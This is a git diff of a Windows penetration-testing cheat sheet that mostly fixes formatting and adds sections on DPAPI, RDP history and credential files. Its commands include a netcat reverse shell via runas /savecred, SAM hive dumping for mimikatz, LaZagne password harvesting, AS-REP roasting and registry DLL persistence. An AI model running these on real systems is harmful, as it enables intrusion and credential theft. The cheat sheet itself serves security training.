@@ -15,7 +15,7 @@ From application version, you can guess which version of Windows the system is r
 ```bash
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" # Displays O.S. Name and Version
 hostname # Displays the hostname
-driverquery # List of installed device drivers and their properties.
+driverquery # List of installed device drivers and their properties
 ```
 
 You can try to see if [wesng](https://github.com/bitsadmin/wesng) say something interesting.
@@ -36,14 +36,23 @@ wmic useraccount get name,sid,fullname # Displays users using WMI
 quser # Identify active user sessions on a computer.
 ```
 
-Check if any user has the **passwordreq** flag set to "no".
-*[/passwordreq](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc771865(v=ws.11)?redirectedfrom=MSDN) Specifies whether a user account must have a password.
+1) Check for recently run commands
+
+```bash
+req query HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+req query HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+```
+
+2) Check if any user has the **passwordreq** flag set to **no**.
+
+*[/passwordreq](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc771865(v=ws.11)?redirectedfrom=MSDN)* specifies whether a user account must have a password.
 
 ```bash
 net user USER | findstr "required"
 ```
 
-If it set to no, you could try to use the **/savecred** parameter of the **runas**.
+If it set to **no**, you could try to use the **/savecred** parameter of the **runas**.
+
 This could be very interesting where it could be done an an account with administrator rights.
 
 ```bash
@@ -51,6 +60,7 @@ runas /user:Administrator /savecred "nc.exe -c cmd.exe IP PORT"
 ```
 
 For more information about that technique refer to [T1087.001 - Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001/)
+
 
 #### Network information
 
@@ -101,9 +111,21 @@ net start "Terminal Services"
 svchost.exe -k termsvcs
 ```
 
+##### Saved RDP Connections
+
+Information about all RDP connections is stored in the registry of each user.
+It’s impossible to remove a computer (or computers) from the list of RDP connection history using built-in Windows tools.
+
+```bash
+reg query HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
+reg query HKCU\Software\Microsoft\Terminal Server Client\Servers\
+```
+
 For more information about that technique refer to [T1021.001 - Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)
 
-#### Interesting Files Enumeration
+#### Credentials
+
+##### Interesting Files Enumeration
 
 ```bash
 c:\sysprep.inf # Could be clear-text credentials
@@ -118,21 +140,26 @@ reg query HKCU /f password /t REG_SZ /s # Search for password in registry keys i
 ```
 
 If you can stage a .exe, you can use [Lazagne](https://github.com/AlessandroZ/LaZagne), which is even used by known APTs such as OilRig
-
 The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer.
 
 LaZagne can retreive password from the following software *groups*:
 
-- Browsers: Firefox, Google Chrome, Opera
-- Mails: Outlook, Thunderbird
+- Browsers: Firefox, Google Chrome, Opera, ...
+- Mails: Outlook, Thunderbird, ...
 - Chats: Pidgin, Psi and Skype
 - Sysadmin: Apache Directory, FileZilla, OpenSSH, KeePass, WinSCP, ...
-- Databases: DBVisualizer, Postgresql, Robomongo, Squirrel & SQLdevelopper
+- Databases: DBVisualizer, Postgresql, Robomongo, Squirrel & SQLdevelopper, ...
+
 &rarr; Would use it if it's seems to be a Dev/DBA/SysAdmin system or database server
+
 - Games: GalconFusion, Kalypsomedia, RogueTale, Turba
+
 &rarr; Would be surprising to find that on professional environment
+
 - Git: Git for Windows
+
 &rarr; Would use if the PC is a server or used by a member of the I.T. / Dev teams
+
 - ...
 
 ```bash
@@ -141,13 +168,47 @@ laZagne.exe all -oJ # Search for password within Browsers, Chats, Databases, Sys
 laZagne.exe browsers -oJ # Search for password within Browsers
 ```
 
+##### Data Protection API
+
+Used by Windows to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy.
+
+DPAPI allows developers to encrypt keys using a symmetric key derived from the **user's logon secrets**
+
+1) Master key
+
+The DPAPI keys used for encrypting the user's RSA keys are stored under *%APPDATA%\Microsoft\Protect\{SID}* directory, where *{SID}* is the Security Identifier of that user.
+
+```bash
+dir C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+dir C:\Users\USER\AppData\Local\Microsoft\Protect\
+```
+
+We can also use mimikatz *dpapi::masterkey* with either */pvk* or */rpc*
+
+2) Credentials files
+
+```bash
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+```
+
+We can also use mimikatz *dpapi::cred* with the appropriate */masterkey*
+
+##### Remote Desktop Credential Manager
+
+```bash
+dir %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+```
+
+We can also use mimikatz *dpapi::rdg* with the appropriate */masterkey*
+
 For more information about those techniques refer to:
 
 - [T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
 - [T1552.002 - Unsecured Credentials: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002/)
 - [T1546.013 - Event Triggered Execution: PowerShell Profile](https://attack.mitre.org/techniques/T1546/013/)
 
-###### *If you don't know, now you know : [Windows Setup Automation](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-installation-process)
+###### *If you don't know, now you know : [Windows Setup Automation](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-installation-process)*
 
 Windows Setup is the program that installs Windows or upgrades an existing Windows installation. It is also the basis for the following installation and upgrade methods:
 
@@ -309,6 +370,7 @@ Check for the following access tokens
   - reg save HKLM\SAM sam.hive
   - reg save HKLM\SYSTEM system.hive
   - reg save hklm\security security.hive
+
   &#8594; mimikatz
 - SeImpersonatePrivilege
 - SeLoadDriverPrivilege
@@ -374,7 +436,7 @@ Here are interesting schedule time for persistence:
 - ONLOGON: Specifies that the task runs whenever a user (any user) logs on. You can specify a date, or run the task the next time the user logs on.
 - ONIDLE: Specifies that the task runs whenever the system is idle for a specified period of time. You can specify a date, or run the task the next time the system is idle.
 
-[SharPersist]https://github.com/fireeye/SharPersist) can be used to try to perform a Scheduled Task Backdoor
+[SharPersist](https://github.com/fireeye/SharPersist) can be used to try to perform a Scheduled Task Backdoor
 
 ```bash
 # Scheduled Task Backdoor
@@ -517,9 +579,10 @@ A Token contains interesting things like:
 ![Access Token Schema](accesstoken.png)
 
 Once an access token is created, you **cannot** changes his privileges, but you **can** enable or disable privileges.
-You can also change the token type
 
-*If you don't know, now you know : [Security Descriptor](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors)*
+You can also change the token type.
+
+###### *If you don't know, now you know : [Security Descriptor](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors)*
 
 Security descriptors define the security attributes of securable objects such as files, registry keys, WMI namespaces, printers, services, or shares.
 
@@ -534,7 +597,7 @@ A security descriptor can include the following security information:
 
 ![Security Descriptor](security-descriptor.png)
 
-###### If you don't know, now you know: [DACLs & ACEs](https://www.windowstechno.com/what-is-ntds-dit/)
+###### *If you don't know, now you know: [DACLs & ACEs](https://www.windowstechno.com/what-is-ntds-dit/)*
 
 How it works
 
@@ -714,7 +777,7 @@ reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecureBoot\State /
 Confirm-SecureBootUEFI (Require privileges)
 ```
 
-If is it not enabled or the system is inferior as Windows, we can created a malicious DLL
+If is it not enabled or the system is inferior as Windows, we can created a malicious DLL.
 
 First, we need to enable LoadAppInit_DLLs
 
@@ -756,11 +819,11 @@ reg query "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\A
 
 **COR_PROFILER** is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR).
 
+```bash
 reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COR_ENABLE_PROFILING /t REG_DWORD /d 1 /f
 reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COR_PROFILER /t REG_SZ /d 0 /f
 reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COR_PROFILER_PATH /t REG_SZ /d 0 /f
-
-
+```
 
 ### Application Shimming
 
@@ -802,14 +865,15 @@ The ALL collection method will perform **a lot of queries**, which could trigger
 
 When we put those four files within Bloundhount, we can search for nodes (Active Directory Object)
 
-###### If you don't know, now you know: [Active Directory Accounts](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts)
+###### *If you don't know, now you know: [Active Directory Accounts](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts)*
 
 - **Default local accounts**: Built-in accounts that are created automatically when a Windows Server domain controller is installed and the domain is created.
 The default local accounts in the Users container include: Administrator, Guest, and KRBTGT.
 - **Administrator account**: Default account that is used in all versions of the Windows operating system on every computer and device.
 The Administrator account is used by the system administrator for tasks that require administrative credentials.
 - **Guest account**: Default local account that has limited access to the computer and is disabled by default.
-By default, the Guest account password is **left blank**. **A blank password** allows the Guest account to be accessed without requiring the user to enter a password.
+By default, the Guest account password is **left blank**.
+**A blank password** allows the Guest account to be accessed without requiring the user to enter a password.
 - **KRBTGT account**: Local default account that acts as a service account for the Key Distribution Center (KDC) service.
 This account cannot be deleted, and the account name cannot be changed.
 
@@ -818,7 +882,7 @@ Every Active Directory domain controller is responsible for handling Kerberos ti
 The password for the KDC account is used to derive a secret key for encrypting and decrypting the ticket-granting ticket (TGT) requests that  are used to authenticate users with Kerberos.
 
 |Account Name|SID & RID|
-|-|-|-|
+|-|-|
 |Administrator account|S-1-5-<domain>-500|
 |Guest account|S-1-5-<domain>-501|
 |KRBTGT account|S-1-5-<domain>-502|
@@ -845,7 +909,7 @@ Domain Local
   - Other Domain Local groups from the same domain
   - Accounts, Global groups, and Universal groups from other forests and from external domains
 
-###### If you don't know, now you know: [Active Directory Security Groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#active-directory-default-security-groups-by-operating-system-version)
+###### *If you don't know, now you know: [Active Directory Security Groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#active-directory-default-security-groups-by-operating-system-version)*
 
 Members of the **Domain Admins** security group are authorized to administer the domain.
 
@@ -869,7 +933,7 @@ The Enterprise Admins group exists only in the root domain of an Active Director
 |Enterprise Admins|S-1-5-21-\<root domain>-519|
 |Group Policy Creator Owners|S-1-5-\<domain>-520|
 
-###### If you don't know, now you know: [Domain Trusts](https://docs.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust)
+###### *If you don't know, now you know: [Domain Trusts](https://docs.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust)*
 
 A trust is a relationship, which you establish between domains that makes it possible for users in the domain to be authenticated by the other domain.
 
@@ -923,13 +987,13 @@ If we perform a AS_REQ request to the DC on behalf of a vulnerable users, we can
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users 
 using PowerView
 
+```bash
 # Try all the usernames in usernames.txt
-
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 
 # Use domain creds to extract targets and target them
-
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+```
 
 #### Ntds.dit file
 
@@ -960,13 +1024,13 @@ If at one point the ntds.dit seems to be corrupted, use [esentutl](https://docs.
 
 For more information about that technique refer to [T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)
 
-###### If you don't know, now you know: [Ntds.dit](https://www.windowstechno.com/what-is-ntds-dit/)
+###### *If you don't know, now you know: [Ntds.dit](https://www.windowstechno.com/what-is-ntds-dit/)*
 
 The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes (NTLM) for all users in the domain.
 
 By default, it is located in "C:\Windows\NTDS\"
 
-###### If you don't know, now you know: [LM-hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)
+###### *If you don't know, now you know: [LM-hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)*
 
 LM-hashes is the oldest password storage used by Windows, in the 1980’s.
 LM was turned off by default starting in Windows Vista/Server 2008.
